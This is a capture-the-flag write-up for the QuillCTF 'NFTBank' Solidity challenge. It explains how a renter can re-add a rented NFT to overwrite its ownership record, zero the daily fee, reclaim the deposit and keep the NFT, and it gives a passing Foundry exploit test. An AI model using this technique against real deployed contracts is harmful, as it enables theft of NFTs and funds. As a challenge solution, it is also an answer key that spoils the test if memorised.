# QuillCTF : NFTBank

## Descritpion
```
Users can rent NFTs from the NFTBank. They have to pay a fixed commission when they want to get rent, and when they want to return NFT,
the contract will take a second fee, depending on how many days you have NFT from.
```

## Objective of CTF
```
You rent an NFT.
After 10 days have passed, if you should hack the contract, and finally have the NFT, the contract should not show, that you have debt.
```

The nftOwner minted 10 nfts, and added each of them to the bank with 2 gwei rentFeePerDay and 500 gwei startRentFee

500 gwei startRentFee is like a deposit we have to make in order to rent the nft, and when we return the nft, we have to pay rentFeePerDay depending on how many days we have rented the nft then we can have the 500 gwei refunded

The bug is in that even we rented the nft, we can still use addNFT() to add the rented nft to the bank and overwrite the nftData in the nfts mapping, so we can become the owner and change rentFeePerDay and startRentFee of that nft

We can just change rentFeePerDay to 0 so we don't have to pay any fee when we are returning the nft to have the 500 gwei startRentFee refunded, we also will set the startRentFee to 500 gwei, so we can still get 500 gwei refunded when we return the nft, if the bank has more than 500 gwei, we can also set it to more than 500 gwei to steal fund

As we have overwritten the nftData in nfts mapping, we are the owner and we can call getBackNft() to get the nft bank from the bank, and calling getBackNft() won't remove us from being the owner in the nftData

So after we get back the nft, we can just call refund() to get the 500 gwei back and it will take our nft, but we are still the owner, so just call getBackNft() again and we can get the nft back

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {NFTBank} from "../src/NFTBank.sol";
import {ERC721} from "openzeppelin-contracts/token/ERC721/ERC721.sol";
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";

contract CryptoKitties is ERC721("CryptoKitties", "MEOW"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}

contract NFTBankHack is Test {
    NFTBank bank;
    CryptoKitties meow;
    address nftOwner = makeAddr("nftOwner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(nftOwner);
        bank = new NFTBank();
        meow = new CryptoKitties();
        for (uint i; i < 10; i++) {
            meow.mint(nftOwner, i);
            meow.approve(address(bank), i);
            bank.addNFT(address(meow), i, 2 gwei, 500 gwei);
        }
        vm.stopPrank();
    }

    function test() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        bank.rent{value: 500 gwei}(address(meow), 1);
        vm.warp(block.timestamp + 86400 * 10);
        //solution       
        meow.approve(address(bank), 1);
        // over nftData of id 1 to become owner, and set rentFeePerDay to 0, but startRentFee remains 500 gwei 
        // (if the bank has more than 500 gwei, we can set startRentFee > 500 gwei to steal fund)
        bank.addNFT(address(meow), 1, 0, 500 gwei);
        // get the nft back overwritten nftData remains
        bank.getBackNft(address(meow), 1, payable(attacker));
        // refund to get back 500 gwei startRentFee, without paying rentFeePerDay, as it's overwritten to 0
        meow.approve(address(bank), 1);
        bank.refund(address(meow), 1);
        // get the nft back as we are still the owner in the nftData
        bank.getBackNft(address(meow), 1, payable(attacker));
        
        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
        assertEq(meow.ownerOf(1), attacker);
    }
}
```

### Foundry test output

```
# forge test --match-path test/NFTBank.t.sol -vv
[⠘] Compiling...
No files changed, compilation skipped

Running 1 test for test/NFTBank.t.sol:NFTBankHack
[PASS] test() (gas: 251552)
Test result: ok. 1 passed; 0 failed; finished in 4.13ms
```
